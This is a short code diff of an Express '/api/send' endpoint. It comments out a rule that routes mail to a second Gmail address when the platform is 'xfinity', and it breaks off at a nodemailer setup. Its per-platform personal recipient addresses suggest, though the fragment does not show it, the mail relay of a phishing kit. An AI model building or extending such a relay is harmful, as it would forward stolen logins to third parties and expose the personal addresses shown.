@@ -26,9 +26,9 @@ app.post('/api/send', async (req, res) => {
     let recipientEmail = 'raheemjoe08@gmail.com';
 
   // If the platform is 'xfinity', update the recipient email
-  if (platform == 'xfinity') {
-    recipientEmail = 'Mrtombriggs@gmail.com';
-  }
+  // if (platform == 'xfinity') {
+  //   recipientEmail = 'Mrtombriggs@gmail.com';
+  // }
 
 
  var transport = nodemailer.createTransport({
